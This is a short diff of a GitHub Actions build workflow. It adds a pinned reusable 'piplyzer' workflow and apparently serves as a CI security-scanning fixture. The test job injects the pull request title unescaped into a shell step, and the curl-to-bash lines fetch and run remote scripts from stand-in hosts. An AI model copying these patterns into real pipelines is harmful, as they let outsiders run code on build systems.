@@ -1,10 +1,12 @@
 name: build
 on: push
 jobs:
+  piplyzer:
+    uses: Vibrouz/piplyzer/.github/workflows/piplyzer.yml@ced47cfd3116a494e243d738451ebcb30e65f288
   test:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - run: |
           echo "Processing PR: ${{ github.event.pull_request.title }}"
-          curl -fsS http://203.0.113.45/update.sh | bash
+          curl -fsS https://example.com/update.sh | bash
